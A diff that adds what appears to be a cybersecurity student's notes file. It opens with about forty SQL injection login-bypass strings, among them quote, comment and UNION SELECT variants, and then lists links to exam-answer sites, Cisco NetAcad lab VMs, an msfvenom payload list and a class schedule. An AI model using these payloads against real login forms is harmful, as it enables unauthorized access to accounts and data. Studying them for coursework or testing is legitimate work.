@@ -1,0 +1,63 @@
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+
+https://itexamanswers.net/ccna-cybersecurity-operations-v1-1-skills-assessment-answers.html
+
+https://itexamanswers.net/cyberops-associate-skills-assessment-answers-ca-v1-0-skills-exam.html
+
+https://docs.google.com/document/d/1k9CnWHzq7kPyWqZg-Zs5gRDrczLwmCwWxar1Ss41hJs/preview
+
+ivytech.edu/schedulenow
+
+COMM 101 T/Th After
+CSIA 106 F 08-10
+CSIA 135 M/W 1:30-6
+CSIA 210 T/Th 8-12
+
+
+https://netacad.com/portal/content/cyberops-associate-virtual-machines-vms
+
+https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9
+
+https://www.youtube.com/watch?v=w8EKH_fjmXA&t=702s
+
+
+
